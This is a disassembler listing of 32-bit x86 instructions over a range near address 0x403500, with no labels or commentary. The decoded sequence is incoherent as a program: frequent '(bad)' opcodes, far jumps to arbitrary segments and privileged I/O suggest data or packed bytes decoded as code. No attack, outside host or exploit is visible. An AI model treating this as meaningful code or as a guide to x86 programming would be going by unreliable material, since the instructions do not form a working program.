  40347a:	das    
  40347b:	mov    edx,0x52137d8d
  403480:	adc    al,0x25
  403482:	cld    
  403483:	add    DWORD PTR [esi-0x3f],edx
  403486:	cmp    dl,al
  403488:	or     edx,ebp
  40348a:	sub    DWORD PTR [ecx-0x1eb04508],ecx
  403490:	cli    
  403491:	mov    edx,0xe68c8f41
  403496:	js     0x40343e
  403498:	mov    eax,ds:0x3c4aff91
  40349d:	sub    BYTE PTR [ecx+0x7733030b],bh
  4034a3:	mov    edi,0xb4d75033
  4034a8:	xor    edx,DWORD PTR [ebx-0x7b]
  4034ab:	cdq    
  4034ac:	pop    ds
  4034ad:	xor    DWORD PTR [edi+0x5beae7d8],ecx
  4034b3:	adc    eax,0x7e22ac1
  4034b8:	fldenv [edx+0x71]
  4034bb:	clc    
  4034bc:	cli    
  4034bd:	retf   0xf86f
  4034c0:	clc    
  4034c1:	ins    BYTE PTR es:[edi],dx
  4034c2:	jb     0x4034c8
  4034c4:	out    0x24,al
  4034c6:	pop    ecx
  4034c7:	out    0x2,al
  4034c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034ca:	popf   
  4034cb:	(bad)
  4034ce:	sahf   
  4034cf:	add    ebx,eax
  4034d1:	mov    eax,DWORD PTR [eax]
	...
  4034e3:	add    al,bh
  4034e5:	mov    cl,0xf7
  4034e7:	and    ecx,DWORD PTR [edx-0x3072054f]
  4034ed:	sbb    eax,0xc20c07d6
  4034f2:	add    edx,DWORD PTR [esi+0x1b]
  4034f5:	enter  0x9c2,0x50
  4034f9:	fmul   DWORD PTR [ebx+0x237af0f8]
  4034ff:	sti    
  403500:	push   eax
  403501:	or     BYTE PTR [ebp+0xd8d548c],0xd5
  403508:	jg     0x40350b
  40350a:	dec    esi
  40350b:	or     al,0x62
  40350d:	(bad)  
  40350e:	push   cs
  40350f:	add    ebp,DWORD PTR [ecx-0x77]
  403512:	cli    
  403513:	xor    ebx,DWORD PTR [edx-0x5f]
  403516:	div    DWORD PTR [ebx]
  403518:	mov    DWORD PTR [ebx+0x13961f9c],ecx
  40351e:	pop    edx
  40351f:	inc    ebp
  403520:	and    BYTE PTR [esi],ah
  403522:	and    cl,al
  403524:	push   eax
  403525:	adc    al,0x3
  403527:	fstp   DWORD PTR [eax-0x3f04cc82]
  40352d:	jns    0x403562
  40352f:	stc    
  403530:	data16 test BYTE PTR [edi],al
  403533:	add    eax,0x3a9614a
  403538:	lea    esi,[ebx+0xdec0c0]
  40353e:	ret    
  40353f:	mov    edi,DWORD PTR [eax]
  403541:	mov    cl,0xf7
  403543:	and    edi,DWORD PTR [edx]
  403545:	mov    cl,0xfa
  403547:	lea    eax,[eax]
	...
  403559:	add    BYTE PTR [edi],bl
  40355b:	sbb    eax,0x7bf4a3f8
  403560:	add    edx,DWORD PTR [esi-0x55]
  403563:	mov    dl,0x9
  403566:	nop
  403567:	xlat   BYTE PTR ds:[ebx]
  403568:	mov    edi,eax
  40356a:	cli    
  40356b:	fidivr WORD PTR [ebp-0x44216edd]
  403571:	lea    edi,[esi-0x4e]
  403574:	fiadd  DWORD PTR [edx]
  403576:	adc    eax,0xde4e0483
  40357b:	in     al,dx
  40357c:	ror    DWORD PTR [esi],0xf9
  40357f:	out    0x8b,eax
  403581:	cli    
  403582:	sub    DWORD PTR [ebp-0x57d6081d],esp
  403588:	xchg   ecx,eax
  403589:	pushf  
  40358a:	std    
  40358b:	daa    
  40358c:	push   eax
  40358d:	sub    al,BYTE PTR [edi+0x3b305dae]
  403593:	outs   dx,BYTE PTR ds:[esi]
  403594:	sbb    BYTE PTR [ebx],al
  403596:	and    esi,DWORD PTR [esi]
  403598:	mov    ebp,0xbabe4033
  40359d:	lea    edi,[esi-0x5e]
  4035a0:	inc    ecx
  4035a1:	cmp    DWORD PTR [eax],esi
  4035a3:	bound  eax,QWORD PTR [ebx]
  4035a5:	inc    esi
  4035a6:	push   cs
  4035a7:	ins    DWORD PTR es:[edi],dx
  4035a8:	les    eax,FWORD PTR [ecx+edi*8]
  4035ab:	outs   dx,BYTE PTR ds:[esi]
  4035ac:	mov    edi,ebx
  4035ae:	leave  
  4035af:	xchg   esp,eax
  4035b0:	repz idiv DWORD PTR [edi+0x59]
  4035b4:	pop    ss
  4035b5:	or     DWORD PTR [esp+edi*4],0xcda40386
  4035bc:	(bad)
	...
  4035d0:	add    DWORD PTR [edi+0x1ff28bd3],ebp
  4035d6:	mov    ebx,0x9029e033
  4035db:	(bad)  
  4035dd:	int    0xa0
  4035df:	ins    DWORD PTR es:[edi],dx
  4035e0:	stc    
  4035e1:	cdq    
  4035e2:	out    dx,eax
  4035e3:	sar    BYTE PTR [ebx+0x71ca02dc],0x46
  4035ea:	repz test DWORD PTR [ecx],0x159c90f5
  4035f1:	fdivr  st,st(3)
  4035f3:	in     al,0xaf
  4035f5:	add    eax,0xc3e25dea
  4035fa:	sub    dl,BYTE PTR [edi]
  4035fc:	stc    
  4035fd:	(bad)  [edx-0x43]
  403600:	leave  
  403601:	mov    esi,0x817fbada
  403606:	out    dx,al
  403607:	inc    edi
  403608:	nop
  403609:	jnp    0x403650
  40360b:	add    esi,DWORD PTR [ecx+eax*1]
  40360e:	sub    ah,al
  403610:	inc    BYTE PTR ds:0xf6718b2a
  403616:	fcomip st,st(2)
  403618:	ins    DWORD PTR es:[edi],dx
  403619:	mov    BYTE PTR [ebp+0x16],dh
  40361c:	xchg   ebx,eax
  40361d:	retf   0x4ab7
  403620:	stc    
  403621:	push   edx
  403622:	stc    
  403623:	les    edi,FWORD PTR [eax]
  403625:	push   cs
  403626:	jmp    0x9ba:0xfabd71d3
  40362d:	mov    edi,0x25058f64
  403632:	and    bh,BYTE PTR [ebx+0x0]
	...
  403645:	add    BYTE PTR [esi+eax*1],ah
  403648:	aaa    
  403649:	and    BYTE PTR [ebx],bh
  40364b:	(bad)  
  40364c:	stc    
  40364d:	add    dh,BYTE PTR [eax]
  40364f:	mov    ss,WORD PTR [ebx-0x7009f20e]
  403655:	nop
  403656:	outs   dx,BYTE PTR ds:[esi]
  403657:	sbb    bh,cl
  403659:	jg     0x4036a0
  40365b:	jnp    0x403647
  40365d:	pop    ebp
  40365e:	rol    bl,cl
  403660:	stos   BYTE PTR es:[edi],al
  403661:	push   ss
  403662:	stc    
  403663:	(bad)  [edx-0x44]
  403666:	sub    DWORD PTR [edi-0x7f8844e6],edi
  40366c:	out    0xc5,al
  40366e:	pop    esp
  40366f:	sahf   
  403670:	add    DWORD PTR [ebx],eax
  403672:	cmp    al,0xf1
  403674:	daa    
  403675:	ret    
  403676:	test   BYTE PTR ds:0xf5c18a2a,0x3f
  40367d:	repnz lds eax,FWORD PTR [edi-0x40f3a300]
  403684:	daa    
  403685:	mov    BYTE PTR [ebx+0x5],ah
  403688:	push   ss
  403689:	sub    BYTE PTR [ebx+0x7039030d],bh
  40368f:	mov    esp,0xbb881233
  403694:	lea    ebx,[ebp-0x4]
  403697:	jg     0x4036c9
  403699:	push   ss
  40369a:	lods   eax,DWORD PTR ds:[esi]
  40369b:	add    eax,0xc3b6ed4e
  4036a0:	adc    dl,ch
  4036a2:	inc    ebx
  4036a3:	(bad)  
  4036a4:	cli    
  4036a5:	mov    edx,0x74f8f5b1
	...
  4036ba:	add    BYTE PTR [eax],al
  4036bc:	call   0x300:0x71fc0519
  4036c3:	aaa    
  4036c4:	test   bl,0xc3
  4036c7:	idiv   dl
  4036c9:	fisttp DWORD PTR [ebx+0x33bb4bc0]
  4036cf:	ret    0x806d
  4036d2:	pop    es
  4036d3:	lock dec ecx
  4036d5:	rcr    cl,1
  4036d7:	jmp    0x5f2:0xa9c0e0b7
  4036de:	ret    
  4036df:	jb     0x403744
  4036e1:	cmc    
  4036e2:	clc    
  4036e3:	ficom  DWORD PTR [ecx-0x79]
  4036e6:	xchg   esp,eax
  4036e7:	not    BYTE PTR [ebx+ebx*4-0x25]
  4036eb:	(bad)  
  4036ec:	sti    
  4036ed:	push   edx
  4036ee:	xor    BYTE PTR [eax-0x66fcf2c8],ch
  4036f4:	cmp    DWORD PTR [ebp-0x41148dcd],0xffffff8d
  4036fb:	jne    0x4036f4
  4036fd:	mov    esp,0x3ff8b7c
  403702:	dec    esi
  403703:	adc    eax,0xea10c6b9
  403708:	ret    
  403709:	mov    edx,?
  40370b:	add    al,al
  40370d:	jl     0x403742
  40370f:	stc    
  403710:	dec    esi
  403711:	gs pop ds
  403713:	gs xchg ebp,eax
  403715:	sub    ah,al
  403717:	add    edi,DWORD PTR [ebp+0xc]
  40371a:	rol    ebx,0xa4
  40371d:	add    eax,0xbfd9
	...
  403732:	cld    
  403733:	jns    0x403734
  403735:	push   DWORD PTR [eax-0x4f04f482]
  40373b:	jnp    0x4036ca
  40373d:	test   BYTE PTR [eax+eax*2+0x5872922],dl
  403744:	push   es
  403745:	shl    DWORD PTR [ebx],0xff
  403748:	add    al,bl
  40374a:	sbb    al,0x7a
  40374c:	(bad)  
  40374d:	call   FWORD PTR [ebp+esi*4-0x8]
  403751:	or     ebx,DWORD PTR [ebx-0x4b]
  403754:	cli    
  403755:	(bad)  
  403756:	xlat   BYTE PTR ds:[ebx]
  403757:	adc    BYTE PTR [edi+0x345f9ff],dl
  40375d:	push   esi
  40375e:	pop    edi
  40375f:	ret    
  403760:	ret    0x500a
  403763:	aam    0xbf
  403765:	jmp    FWORD PTR [ecx+edi*2-0x1]
  403769:	xor    ebp,DWORD PTR [eax+0xd]
  40376c:	cli    
  40376d:	xor    ebx,DWORD PTR [ebx-0x79]
  403770:	mov    WORD PTR [edi],cs
  403772:	mov    ah,0xa4
  403774:	xchg   ebx,eax
  403775:	stos   DWORD PTR es:[edi],eax
  403776:	and    BYTE PTR [edx+0x38],cl
  403779:	shl    DWORD PTR [edx+0x9],0x3
  40377d:	retf   0x78bc
  403780:	(bad)  
  403781:	(bad)  
  403782:	jl     0x403738
  403784:	test   DWORD PTR [ebx],0x8df9b56a
  40378a:	aas    
  40378b:	sbb    DWORD PTR [ecx],edi
  40378d:	mov    al,ds:0x5e037860
  403792:	out    0xc2,eax
  403794:	ret    
  403795:	adc    eax,0x0
	...
  4037a6:	add    BYTE PTR [eax],al
  4037a8:	cli    
  4037a9:	stos   BYTE PTR es:[edi],al
  4037aa:	fidivr DWORD PTR [edi-0x43b933]
  4037b0:	or     DWORD PTR [eax+ecx*1-0x5],eax
  4037b4:	or     DWORD PTR [ebp-0x72],eax
  4037b7:	test   ch,bh
  4037b9:	jmp    0x3045:0xab175b59
  4037c0:	mov    ebx,0xb90304ed
  4037c5:	push   esi
  4037c6:	mov    esp,0xf00e95ff
  4037cb:	clc    
  4037cc:	add    DWORD PTR [esi],edx
  4037ce:	lock cli 
  4037d0:	ja     0x40382b
  4037d2:	adc    al,0x92
  4037d4:	scas   al,BYTE PTR es:[edi]
  4037d5:	test   eax,0xa1cc038c
  4037da:	ret    0xc2
  4037dd:	stos   DWORD PTR es:[edi],eax
  4037de:	sar    DWORD PTR [edi-0x44619b],cl
  4037e4:	sub    DWORD PTR [ebx-0x29f605f1],esp
  4037ea:	mov    DWORD PTR [ebp+edi*8+0x45efb048],ecx
  4037f1:	stos   BYTE PTR es:[edi],al
  4037f2:	dec    ecx
  4037f3:	sub    BYTE PTR [ebx],bh
  4037f5:	ins    BYTE PTR es:[edi],dx
  4037f6:	or     eax,DWORD PTR [ebx]
  4037f8:	inc    eax
  4037f9:	cs mov ebx,0xf7662dff
  4037ff:	div    ecx
  403801:	fs idiv ecx
  403804:	outs   dx,DWORD PTR ds:[esi]
  403805:	cmp    DWORD PTR [ebx],ebx
  403807:	shl    DWORD PTR [edi+0x38129],1
	...
  40381d:	add    BYTE PTR [ecx+eiz*4-0x55103c3c],ch
  403824:	fdivr  QWORD PTR [edi-0x44ca03]
  40382a:	sub    DWORD PTR [edx],esi
  40382c:	psubq  mm5,QWORD PTR [ecx]
  40382f:	xor    eax,0x4fd8489
  403834:	mov    dh,0x39
  403836:	xchg   edx,eax
  403837:	es jmp 0xf902:0x29c41a41
  40383f:	ror    DWORD PTR [esi+0x46b6c5bb],0xf7
  403846:	ret    0x410a
  403849:	div    DWORD PTR [eax-0x65eca278]
  40384f:	lahf   
  403850:	std    
  403851:	mov    ecx,0xc4e54ef9
  403856:	mov    eax,0x55d3ea0b
  40385b:	mov    dh,0x16
  40385d:	mov    ebx,0xf11f28d
  403862:	xor    dl,0x0
  403865:	mov    DWORD PTR [esi+0x6],ebp
  403868:	aad    0x46
  40386a:	sti    
  40386b:	popa   
  40386c:	jmp    0xf90b:0x28c41249
  403873:	retf   0xbaa6
  403876:	pop    ebp
  403877:	mov    dh,0xde
  403879:	test   BYTE PTR [ebp+0xa],0xd0
  40387d:	not    BYTE PTR [ebx-0x78]
  403880:	ins    DWORD PTR es:[edi],dx
  403881:	sbb    al,BYTE PTR [eax]
	...
  403893:	add    BYTE PTR [ebx-0x6b60eec],bl
  403899:	push   esi
  40389a:	cmc    
  40389b:	les    edi,FWORD PTR [ecx]
  40389d:	adc    dl,ch
  40389f:	fsubr  QWORD PTR [ebp-0x4a]
  4038a2:	scas   al,BYTE PTR es:[edi]
  4038a3:	mov    edx,0xea2f225
  4038a8:	and    edx,esi
  4038aa:	lahf   
  4038ab:	mov    BYTE PTR [esi-0x2],bh
  4038ae:	push   0x39
  4038b0:	test   eax,0xea41eaad
  4038b5:	ret    
  4038b6:	test   eax,0x3ec1f901
  4038bb:	mov    edx,0x7600b5f5
  4038c0:	in     al,0xbc
  4038c2:	or     esi,DWORD PTR [ecx-0x14]
  4038c5:	mov    edx,0xf0087d8d
  4038ca:	icebp  
  4038cb:	and    edx,DWORD PTR [ebx+0x2]
  4038ce:	push   esi
  4038cf:	add    eax,0xea0ac2b7
  4038d4:	test   eax,0x8046ff75
  4038d9:	mov    ch,0x33
  4038db:	inc    edx
  4038dc:	add    al,0xbb
  4038de:	xor    esi,DWORD PTR [ecx]
  4038e0:	or     BYTE PTR [eax-0x32308df1],0x2a
  4038e7:	jmp    0x200:0x28c10d33
  4038ee:	retf   0x5056
  4038f1:	mov    ch,0xff
  4038f3:	push   cs
  4038f4:	mov    WORD PTR [ebp+0xb],gs
	...
  40390a:	test   BYTE PTR [ebx-0x6befa273],bh
  403910:	shr    DWORD PTR [edi-0x64],cl
  403913:	add    DWORD PTR [esi-0x3b],ebx
  403916:	rcl    DWORD PTR ds:0x7d8940ea,0xf1
  40391e:	clc    
  40391f:	std    
  403920:	add    BYTE PTR [esi],dh
  403922:	cli    
  403923:	add    ecx,DWORD PTR [edi-0x1f]
  403926:	clc    
  403927:	dec    ebp
  403928:	or     al,0xc6
  40392a:	mov    ch,0xb8
  40392c:	lea    esi,[edi]
  40392e:	mov    esi,0x6fe68905
  403933:	mov    ch,0xff
  403935:	adc    eax,ecx
  403937:	pop    ecx
  403938:	pop    eax
  403939:	inc    esi
  40393a:	ror    bl,0xc2
  40393d:	in     eax,dx
  40393e:	stc    
  40393f:	dec    edi
  403940:	mov    eax,DWORD PTR [ebp+0x36f8c077]
  403946:	test   al,0x51
  403948:	mov    DWORD PTR [eax],0x7cce
  40394e:	jecxz  0x403958
  403950:	push   DWORD PTR [ebp-0x29]
  403953:	jge    0x40399a
  403955:	clc    
  403956:	pushf  
  403957:	mov    ah,0x3f
  403959:	gs xchg edx,eax
  40395b:	or     BYTE PTR [ecx],al
  40395d:	and    ebx,DWORD PTR [esi-0x60fa391b]
  403963:	adc    eax,DWORD PTR [ecx+0x0]
  403966:	pop    edx
  403967:	and    cl,ch
  403969:	out    dx,eax
  40396a:	or     al,0xb4
  40396c:	inc    edi
  40396d:	add    BYTE PTR gs:[eax],al
	...
  403980:	bound  ecx,QWORD PTR [eax]
  403982:	(bad)  
  403983:	fsubr  QWORD PTR [ecx]
  403985:	xchg   ecx,eax
  403986:	mov    DWORD PTR ds:0x411387,0x1032447d
  403990:	fdiv   QWORD PTR [ebx+0x862654f]
  403996:	lock loope 0x40395a
  403999:	leave  
  40399a:	jmp    0x4039b8
  40399c:	or     ah,dh
  40399e:	pop    es
  40399f:	add    ebx,DWORD PTR [esi+0x7b406a7c]
  4039a5:	inc    esp
  4039a6:	gs inc ecx
  4039a8:	push   ebx
  4039a9:	pop    eax
  4039aa:	call   0xffad8412
  4039af:	sbb    DWORD PTR [esi],0x6d
  4039b2:	inc    eax
  4039b3:	call   0x40424f
  4039b8:	shr    dl,1
  4039ba:	test   DWORD PTR [eax+0x0],0x3b5d8bcf
  4039c1:	mov    ebx,eax
  4039c3:	inc    eax
  4039c4:	cwde   
  4039c5:	repnz pop es
  4039c7:	add    ebx,esi
  4039c9:	ins    BYTE PTR es:[edi],dx
  4039ca:	push   ebx
  4039cb:	push   0x4113df
  4039d0:	shl    DWORD PTR [eax+0x3c],cl
  4039d3:	jmp    0x1f8d4d2
  4039d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039d9:	add    ecx,0x4300a683
  4039df:	add    BYTE PTR [edx+0x1e],bh
  4039e2:	lods   al,BYTE PTR ds:[esi]
  4039e3:	aaa    
	...
  4039f4:	add    BYTE PTR [eax],al
  4039f6:	xlat   BYTE PTR fs:[ebx]
  4039f8:	test   bl,ch
  4039fa:	repnz mov ecx,0x3199800d
  403a00:	push   ds
  403a01:	inc    ecx
  403a02:	cli    
  403a03:	popf   
  403a04:	inc    esp
  403a05:	js     0x4039cb
  403a07:	inc    ebp
  403a08:	mov    WORD PTR [eax],es
  403a0a:	cli    
  403a0b:	popf   
  403a0c:	jl     0x4039d6
  403a0e:	mov    ebp,0xf8ebb84a
  403a13:	jns    0x403a22
  403a15:	sbb    BYTE PTR [ecx+0x29],0x1e
  403a19:	inc    ecx
  403a1a:	cli    
  403a1b:	popf   
  403a1c:	inc    esp
  403a1d:	js     0x4039c3
  403a1f:	ss ds or al,0x53
  403a23:	mov    ch,0x3
  403a25:	add    dl,bh
  403a27:	into   
  403a28:	aad    0xf7
  403a2a:	fwait
  403a2b:	ror    bl,cl
  403a2d:	cmpxchg BYTE PTR [esi],bh
  403a30:	xchg   ebx,eax
  403a31:	gs mov ebx,0x7e158a9d
  403a37:	add    BYTE PTR [edx+0x0],0x52
  403a3b:	xchg   ebp,eax
  403a3c:	add    eax,DWORD PTR [eax]
  403a3e:	cli    
  403a3f:	jl     0x403a85
  403a41:	gs mov ebx,0xb6158a9d
  403a47:	inc    eax
  403a48:	inc    ebp
  403a49:	add    BYTE PTR [ecx-0x30],dh
  403a4c:	dec    ebx
  403a4d:	gs mov ebx,0x5c8069d
  403a53:	js     0x403a5c
  403a55:	leave  
  403a56:	pop    ecx
  403a57:	frstor [eax]
  403a59:	inc    ecx
	...
  403a6a:	add    BYTE PTR [eax],al
  403a6c:	cli    
  403a6d:	and    al,0x11
  403a6f:	inc    esp
  403a70:	xchg   edi,eax
  403a71:	add    al,0x28
  403a73:	add    al,0x83
  403a75:	add    DWORD PTR [ecx],esi
  403a77:	and    DWORD PTR [ebx-0x60b7b7fc],edi
  403a7d:	inc    ebp
  403a7e:	jmp    0xc95220d
  403a83:	inc    ebp
  403a84:	cli    
  403a85:	add    DWORD PTR [ecx+0x2566c007],esi
  403a8b:	and    DWORD PTR [ebx],edi
  403a8d:	add    eax,0x284a1160
  403a92:	test   al,0x3
  403a94:	pusha  
  403a95:	sbb    DWORD PTR [esi+0x31],ebx
  403a98:	jmp    0x4105:0x3b20a91c
  403a9f:	xchg   ecx,eax
  403aa0:	shl    BYTE PTR [edx+0x52545b46],cl
  403aa6:	xor    dl,al
  403aa8:	inc    BYTE PTR [esp+ebx*4]
  403aab:	mov    dl,BYTE PTR [esi+0x63bc2586]
  403ab1:	lods   eax,DWORD PTR ds:[esi]
  403ab2:	es mov bh,0x95
  403ab5:	jle    0x403a9c
  403ab7:	enter  0x2866,0xa8
  403abb:	add    esi,DWORD PTR [ecx+0x19]
  403abe:	sbb    al,0x9c
  403ac0:	pop    ss
  403ac1:	inc    esp
  403ac2:	jmp    0x33427ccd
  403ac7:	(bad)  
  403ac8:	idiv   BYTE PTR [edi+0x4bb215d]
  403ace:	pusha  
  403acf:	adc    BYTE PTR [eax],al
	...
  403ae1:	add    BYTE PTR [edi],ch
  403ae3:	lea    ecx,[ebp+eax*2-0x6]
  403ae7:	inc    ebx
  403ae8:	push   esp
  403ae9:	fst    DWORD PTR [ebx+0x45b6d6c5]
  403aef:	jle    0x403ad6
  403af1:	mov    BYTE PTR [edx+0x2b],dh
  403af4:	sub    BYTE PTR [ecx+eax*4],al
  403af7:	sbb    DWORD PTR [edi+ebp*1-0x6c],ebp
  403afb:	inc    ebx
  403afc:	add    cl,ch
  403afe:	sub    BYTE PTR [esi],al
  403b00:	lea    ecx,ds:0xda0043fc
  403b06:	add    eax,0xb7075480
  403b0b:	add    al,0x33
  403b0d:	stos   DWORD PTR es:[edi],eax
  403b0e:	lds    ecx,FWORD PTR cs:[ecx+0x669972e5]
  403b15:	sub    dh,bh
  403b17:	inc    ebx
  403b18:	jne    0x403ab1
  403b1a:	or     BYTE PTR [edi],0x40
  403b1d:	or     al,0x3f
  403b1f:	add    eax,0x281db48b
  403b24:	inc    ecx
  403b25:	jmp    0xc4882aaa
  403b2a:	ss add eax,0x28321cff
  403b30:	inc    ecx
  403b31:	jmp    0x473c82aa
  403b36:	stos   BYTE PTR es:[edi],al
  403b37:	inc    ecx
  403b38:	gs test al,0xf9
  403b3b:	add    DWORD PTR [ebp+0x31],0x2effa126
  403b42:	fs jge 0x403b1b
  403b45:	jb     0x403b47
	...
  403b57:	add    BYTE PTR [ecx+edi*4-0x2e],dl
  403b5b:	retf   0xe54f
  403b5e:	push   esp
  403b5f:	adc    eax,0xe503c6f0
  403b64:	jb     0x403bce
  403b66:	gs test al,0xf9
  403b69:	add    eax,0x8bfa0145
  403b6e:	jns    0x403bdb
  403b70:	ret    
  403b71:	mov    cl,0x75
  403b73:	in     eax,dx
  403b74:	ja     0x403bbd
  403b76:	clc    
  403b77:	jo     0x403b86
  403b79:	mov    cl,0xc1
  403b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b7c:	in     al,0x7d
  403b7e:	(bad)  
  403b7f:	bound  ecx,QWORD PTR [ebx-0x51b3c3d]
  403b85:	int3   
  403b86:	inc    ecx
  403b87:	add    dh,dh
  403b89:	mov    esp,0x776cecb9
  403b8e:	dec    DWORD PTR [ebx+0x33d77b55]
  403b94:	(bad)  
  403b95:	ins    BYTE PTR es:[edi],dx
  403b96:	xor    eax,edx
  403b98:	and    BYTE PTR [ecx+0x45f6f48c],dh
  403b9e:	add    BYTE PTR [ebx],al
  403ba0:	(bad)  
  403ba1:	jo     0x403ba8
  403ba3:	mov    eax,ds:0xff6ecd78
  403ba8:	idiv   BYTE PTR [eax-0x71]
  403bab:	inc    ebp
  403bac:	jnp    0x403c2a
  403bae:	jge    0x403bac
  403bb0:	xchg   edx,eax
  403bb1:	outs   dx,DWORD PTR ds:[esi]
  403bb2:	push   ds
  403bb3:	mov    ecx,DWORD PTR [ebp+0x7e]
  403bb6:	repz shl DWORD PTR [eax],0xb0
  403bba:	add    bl,al
	...
  403bcc:	add    BYTE PTR [eax],al
  403bce:	mov    ds:0x3fb9cfdf,al
  403bd3:	jp     0x403bd4
  403bd5:	call   FWORD PTR [eax+0x72]
  403bd8:	mov    edx,DWORD PTR [ebp+0x3f]
  403bdb:	inc    BYTE PTR [esp+edi*8+0x0]
  403bdf:	ret    0xc623
  403be2:	cwde   
  403be3:	mov    BYTE PTR [ebx],0x4
  403be6:	ds inc ebp
  403be8:	inc    cx
  403bea:	mov    ds:0x96f84505,eax
  403bef:	fdivr  DWORD PTR [ebx+ebx*1-0x38a85e4]
  403bf6:	sbb    al,0xf0
  403bf8:	test   DWORD PTR [ecx-0x393e8782],0x8bfe7d4d
  403c02:	pusha  
  403c03:	ret    
  403c04:	ret    
  403c05:	add    eax,0x7541cc50
  403c0a:	mov    BYTE PTR [ebx],ch
  403c0c:	in     al,dx
  403c0d:	jmp    FWORD PTR [ecx+edi*2]
  403c10:	mov    eax,esi
  403c12:	cli    
  403c13:	and    cl,ah
  403c15:	xor    esi,DWORD PTR [edi-0x63e0f3f]
  403c1b:	mov    eax,ds:0xdc949486
  403c20:	add    eax,DWORD PTR [ebx]
  403c22:	mov    edi,0x3bd5fe75
  403c27:	cmp    al,0xca
  403c29:	dec    DWORD PTR [edi+0x12458469]
  403c2f:	xor    eax,0xfc36
	...
  403c44:	cmp    esp,DWORD PTR [eax+0x15]
  403c47:	mov    edi,esp
  403c49:	and    dh,BYTE PTR [eax+0xa0b9c1]
  403c4f:	fdivr  DWORD PTR [ebx]
  403c51:	mov    ecx,0xde0701d3
  403c56:	push   ds
  403c57:	inc    ecx
  403c58:	cli    
  403c59:	pushf  
  403c5a:	out    dx,al
  403c5b:	inc    ebx
  403c5c:	pop    edi
  403c5d:	pop    ebp
  403c5e:	add    eax,DWORD PTR [ecx]
  403c60:	pcmpeqd mm3,QWORD PTR [esi]
  403c63:	inc    ecx
  403c64:	cli    
  403c65:	and    bh,BYTE PTR [esi]
  403c67:	cld    
  403c68:	sti    
  403c69:	test   al,0x47
  403c6b:	cmp    ebx,DWORD PTR gs:[esi-0x634dba78]
  403c72:	dec    BYTE PTR [edi+0x1f]
  403c75:	pop    ebp
  403c76:	add    ecx,ecx
  403c78:	mov    ecx,0x95ec8898
  403c7d:	nop
  403c7e:	or     ebp,eax
  403c80:	or     esp,DWORD PTR ds:0x15790003
  403c86:	mov    ah,0x75
  403c88:	aam    0xfe
  403c8a:	sub    eax,0x7a936208
  403c8f:	add    dl,bh
  403c91:	mov    dl,0xc3
  403c93:	jne    0x403c92
  403c95:	cmc    
  403c96:	mov    bl,0xff
  403c98:	pop    ebp
  403c99:	sahf   
  403c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9b:	adc    eax,DWORD PTR [ecx+0x6a002904]
  403ca1:	sti    
  403ca2:	test   al,0x39
  403ca4:	std    
  403ca5:	ins    BYTE PTR es:[edi],dx
  403ca6:	(bad)  
  403ca7:	mov    bl,0x0
	...
  403cb9:	add    BYTE PTR ds:0x8108c2af,bh
  403cbf:	add    al,0x72
  403cc1:	add    al,0x43
  403cc3:	ret    0x3e5
  403cc6:	iret   
  403cc7:	jnp    0x403c8e
  403cc9:	xchg   DWORD PTR [esi],esi
  403ccb:	mov    ah,0x1a
  403ccd:	div    DWORD PTR [eax]
  403ccf:	sbb    ch,bh
  403cd1:	sbb    eax,0x9beb1afb
  403cd6:	shr    BYTE PTR [ebp-0x17],0x3
  403cda:	jns    0x403c88
  403cdc:	mov    ?,WORD PTR [ecx]
  403cde:	clc    
  403cdf:	cdq    
  403ce0:	or     edi,DWORD PTR [edi-0x2e]
  403ce3:	sbb    ebx,ecx
  403ce5:	cmp    BYTE PTR [edi],0xb5
  403ce8:	sbb    DWORD PTR [edx+esi*2+0x5cb36ea7],ebx
  403cef:	(bad)  
  403cf0:	lods   al,BYTE PTR ds:[esi]
  403cf1:	mov    bl,0xf8
  403cf3:	add    al,0x72
  403cf5:	inc    ecx
  403cf6:	jmp    0x5b40:0x732a2486
  403cfd:	xchg   DWORD PTR [edi],esi
  403cff:	add    ecx,ebp
  403d01:	aaa    
  403d02:	idiv   DWORD PTR [ecx-0x5c]
  403d05:	call   DWORD PTR [eax-0x11ce95f2]
  403d0b:	add    al,0xb4
  403d0d:	std    
  403d0e:	js     0x403d40
  403d10:	icebp  
  403d11:	add    eax,DWORD PTR [edi]
  403d13:	or     DWORD PTR [edx],edx
  403d15:	jmp    0x39563baa
  403d1a:	repnz pushf 
  403d1c:	jge    0x403cd0
	...
  403d2e:	add    BYTE PTR [eax],al
  403d30:	jne    0x403ce0
  403d32:	push   0xffffffac
  403d34:	ins    DWORD PTR es:[edi],dx
  403d35:	cmp    bl,ch
  403d37:	sahf   
  403d38:	push   cs
  403d39:	jl     0x403d3b
  403d3b:	lods   al,BYTE PTR ds:[esi]
  403d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d3d:	sbb    edx,DWORD PTR [eax]
  403d3f:	pop    esp
  403d40:	ret    
  403d41:	mov    ah,0x50
  403d43:	cmp    ch,BYTE PTR [esi-0x57]
  403d46:	mov    eax,0xf881f9e9
  403d4b:	(bad)  
  403d4c:	add    bh,ch
  403d4e:	push   edx
  403d4f:	ror    DWORD PTR [eax+0x6d],0x0
  403d53:	jmp    0xaacc087c
  403d58:	mov    ah,0xbb
  403d5a:	ret    0xf9e5
  403d5d:	push   edi
  403d5e:	mov    edi,DWORD PTR [ebp+0x248355ac]
  403d64:	out    0x4,al
  403d66:	jne    0x403d5a
  403d68:	xchg   ecx,eax
  403d69:	add    eax,DWORD PTR [eax]
  403d6b:	jmp    0xa09b8b69
  403d70:	mov    edi,0x2a720000
  403d75:	add    DWORD PTR [ebx+0x4f9e9],edi
  403d7b:	add    esi,esi
  403d7d:	lods   eax,DWORD PTR ds:[esi]
  403d7e:	jne    0x403d59
  403d80:	xor    BYTE PTR [esi+0x7471f175],ch
  403d86:	mov    eax,0xc087f9e9
  403d8b:	xlat   BYTE PTR ds:[ebx]
  403d8c:	in     eax,0x1
  403d8e:	clc    
  403d8f:	add    BYTE PTR [ebx+0x15],al
  403d92:	add    esp,0x0
	...
  403da5:	add    BYTE PTR [ecx],cl
  403da7:	add    eax,0x414e675
  403dac:	add    cl,ch
  403dae:	stc    
  403daf:	cdq    
  403db0:	add    al,BYTE PTR [edx-0x39]
  403db3:	jns    0x403d78
  403db5:	(bad)  
  403db6:	cmp    al,0xbc
  403db8:	ret    0xf9ed
  403dbb:	push   edi
  403dbc:	mov    eax,DWORD PTR ds:0xff4c876
  403dc2:	test   al,0xad
